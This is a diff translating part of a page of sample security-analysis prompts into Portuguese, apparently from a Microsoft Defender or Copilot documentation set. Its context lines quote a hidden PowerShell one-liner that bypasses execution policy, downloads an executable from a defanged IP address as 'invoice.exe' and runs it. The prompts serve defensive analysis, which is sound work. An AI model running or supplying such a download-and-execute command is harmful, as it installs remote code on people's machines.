@@ -1,4 +1,4 @@
-# Script Analysis
+# Análise de scripts
 <a name="Script Analysis"></a>
 - What actions are performed by this script?
 - Explain how this script could be used maliciously
@@ -12,6 +12,6 @@ machines.
 - Give me recommendations to protect my organization against this script
 - **Analyze this script**: powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('hxxp://54.161.241.46/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 
-Disclaimer: Please know these are sample prompts and are subject to Change
+Aviso de isenção de responsabilidade: estes prompts são apenas exemplos e estão sujeitos a alterações.
 
 ***
